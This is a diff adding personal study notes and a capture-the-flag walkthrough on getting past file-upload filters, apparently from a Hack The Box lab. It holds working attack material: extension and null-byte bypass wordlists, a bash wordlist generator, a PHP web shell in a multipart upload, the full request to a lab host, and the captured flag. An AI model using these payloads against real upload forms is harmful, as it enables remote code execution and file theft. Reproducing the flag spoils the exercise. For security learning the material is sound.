@@ -36,3 +36,126 @@ However, this may not always work, as some web applications may use a strict reg
 
 This pattern should only consider the final file extension, as it uses (^.*\.) to match everything up to the last (.), and then uses ($) at the end to only match extensions that end the file name. So, the above attack would not work. Nevertheless, some exploitation techniques may allow us to bypass this pattern, but most rely on misconfigurations or outdated systems.
 
+Reverse Double Extension
+In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability. For example, an organization may use an open-source web application, which has a file upload functionality. Even if the file upload functionality uses a strict regex pattern that only matches the final extension in the file name, the organization may use the insecure configurations for the web server.
+
+For example, the /etc/apache2/mods-enabled/php7.4.conf for the Apache2 web server may include the following configuration:
+
+EXAMPLE: 
+<FilesMatch ".+\.ph(ar|p|tml)">
+    SetHandler application/x-httpd-php
+
+Character Injection
+Finally, let's discuss another method of bypassing a whitelist validation test through Character Injection. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.
+
+The following are some of the characters we may try injecting:
+
+%20
+%0a
+%00
+%0d0a
+/
+.\
+.
+…
+:
+Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (:) before the allowed file extension (e.g. shell.aspx:.jpg), which should also write the file as (shell.aspx). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.
+
+We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG extensions, as follows:
+
+EXAMPLE: 
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+
+
+CHALLENGE: 94.237.53.146:54003
+
+Question 1 - The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"
+1) just like last section find a random pic on internet
+2) catch POST request -> send to intruder 
+3) change Request BODY to -> 
+
+-----------------------------152355980412830395061698440891
+Content-Disposition: form-data; name="uploadFile"; filename="Untitled§.php§.jpg"
+Content-Type: image/jpg
+
+<?php system('cat /flag.txt'); ?>
+
+-----------------------------152355980412830395061698440891--
+
+4) use worlist below to test double extensions
+
+.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+
+5) disable url encode 
+6) run sniper 
+7) we see multiple 230 and 229 lengths. 
+8) send that Request to Repeater now 
+9) change Request Body to -> 
+
+POST /upload.php HTTP/1.1
+Host: 94.237.53.146:54003
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.53.146:54003/
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------152355980412830395061698440891
+Content-Length: 273
+Origin: http://94.237.53.146:54003
+DNT: 1
+Connection: keep-alive
+Sec-GPC: 1
+Priority: u=0
+
+-----------------------------152355980412830395061698440891
+Content-Disposition: form-data; name="uploadFile"; filename="readFlag.phar.jpg"
+Content-Type: image/jpg
+
+
+<?php system('cat /flag.txt'); ?>
+
+-----------------------------152355980412830395061698440891--
+
+10) send that mug and the response should be -> 
+HTTP/1.1 200 OK
+Date: Thu, 13 Mar 2025 20:42:52 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 26
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+File successfully uploaded
+
+11) curl that boiiiiiiiiiiii -> curl -s http://94.237.53.146:54003/profile_images/readFlag.phar.jpg
+�
+�HTB{1_wh173l157_my53lf}
+
